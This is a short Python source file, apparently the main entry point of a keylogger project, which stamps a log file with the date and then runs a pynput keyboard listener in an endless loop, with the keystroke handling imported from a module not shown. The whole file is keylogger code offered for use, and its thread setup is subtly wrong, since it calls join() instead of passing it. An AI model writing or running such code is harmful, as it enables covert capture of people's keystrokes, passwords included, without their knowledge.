import threading
from pynput.keyboard import Listener
from src.functions.listener import *
from datetime import date

def join():
    appListener()
    with open(fileName, "a") as f:
        dataToday = date.today()  # date of everytime keylogger is open
        f.write(str(dataToday) + "\n")
        f.close()

    with Listener(on_press=on_press) as ls:
        while True:
            ls.join()

if __name__ == "__main__":
    try:
        threading.Thread(target=join()).start()
    except Exception as e:
        print(e)
